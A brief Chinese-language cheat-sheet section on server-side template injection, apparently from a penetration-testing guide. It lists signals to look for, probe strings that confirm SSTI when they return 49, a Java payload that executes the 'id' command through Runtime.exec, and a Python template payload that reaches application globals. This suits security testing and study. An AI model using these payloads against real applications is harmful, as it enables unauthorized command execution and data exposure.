# §14 SSTI
### 识别信号
- 模板输出（用户信息/邮件/报告/错误页）
### 决策流程
```
注入${7*7} {{7*7}} #{7*7} → 返回49=SSTI✅
Java: ${T(java.lang.Runtime).getRuntime().exec('id')}
Python: {{config.__class__.__init__.__globals__}}
```
